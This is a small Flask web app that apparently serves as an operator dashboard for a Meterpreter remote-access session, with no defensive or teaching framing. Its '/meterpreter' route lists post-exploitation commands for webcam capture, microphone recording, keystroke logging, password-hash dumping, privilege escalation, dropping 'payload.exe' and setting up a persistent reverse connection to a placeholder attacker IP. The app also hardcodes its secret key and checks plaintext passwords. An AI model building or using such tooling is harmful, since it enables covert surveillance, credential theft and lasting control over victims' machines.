from flask import Flask, request, redirect, url_for, render_template, session, send_file
import os, base64, sqlite3
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'supersecret'
DB_PATH = 'users.db'
UPLOAD_FOLDER = 'k4log'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def log_action(user, action, detail):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO logs (username, action, details, timestamp) VALUES (?, ?, ?, ?)",
                 (user, action, detail, datetime.now().isoformat()))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    if not session.get('user'): return redirect('/login')
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form['username']
        pw = request.form['password']
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT role FROM users WHERE username=? AND password=?", (user, pw))
        row = cur.fetchone()
        if row:
            session['user'], session['role'] = user, row[0]
            return redirect('/')
        return 'Invalid credentials'
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/meterpreter')
def meterpreter():
    if not session.get('user'): return redirect('/login')
    commands = [
        'sysinfo',
        'shell',
        'screenshot',
        'webcam_snap',
        'record_mic',
        'download /sdcard/DCIM/image.jpg',
        'upload payload.exe C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe',
        'keyscan_start',
        'keyscan_dump',
        'hashdump',
        'getuid',
        'getsystem',
        'persistence -X -i 5 -p 4444 -r your_ip'
    ]
    return render_template('meterpreter.html', commands=commands)

if __name__ == '__main__':
    app.run(debug=True)
